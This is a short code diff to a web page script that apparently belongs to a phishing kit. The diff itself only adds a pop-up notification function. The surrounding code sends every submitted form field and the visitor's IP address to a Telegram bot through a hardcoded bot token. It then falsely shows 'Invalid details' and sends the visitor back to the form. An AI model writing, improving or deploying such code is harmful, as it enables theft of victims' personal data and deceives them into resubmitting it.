@@ -1,3 +1,13 @@
+function showNotification(message, duration = 3000) {
+  const notification = document.getElementById("notification");
+  notification.innerText = message;
+  notification.style.display = "block";
+
+  // Hide after duration
+  setTimeout(() => {
+    notification.style.display = "none";
+  }, duration);
+}
 document.addEventListener("DOMContentLoaded", () => {
 const DEFAULT_USER_ID = "7642510889"; // fallback if no id in URL
 const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
@@ -62,8 +72,7 @@ e.preventDefault();
       `📍 IP: ${userIP}\n\n` + // <-- added IP line  
       Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),  
     parse_mode: "Markdown"  
-  };  
-
+  };
   try {  
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
       method: "POST",  
@@ -72,7 +81,7 @@ e.preventDefault();
     });  
 
     if (response.ok) {  
-      alert(`⛔  invalid details`);  
+      showNotification("⛔ Invalid details");
       form.reset();  
       window.location.href = `index.html?id=${userId}`;  
     } else {  
